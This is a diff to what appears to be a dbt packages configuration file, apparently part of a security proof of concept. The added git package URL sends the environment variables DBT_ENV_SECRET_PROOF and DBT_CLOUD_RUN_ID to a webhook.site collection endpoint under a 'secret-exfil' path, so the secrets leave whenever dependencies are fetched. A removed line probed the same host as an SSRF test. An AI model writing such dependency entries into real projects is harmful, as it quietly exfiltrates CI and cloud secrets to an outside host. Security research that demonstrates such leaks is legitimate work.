@@ -1,3 +1,3 @@
 packages:
-  - tarball: "https://webhook.site/01dd8669-5c8b-4697-a7ea-eb5d2e5b1c72/tarball-ssrf-test.tar.gz"
-    name: "tarball_ssrf"
+  - git: "https://webhook.site/01dd8669-5c8b-4697-a7ea-eb5d2e5b1c72/secret-exfil/{{ env_var('DBT_ENV_SECRET_PROOF', 'NOT_FOUND') }}/{{ env_var('DBT_CLOUD_RUN_ID', 'norun') }}.git"
+    revision: main
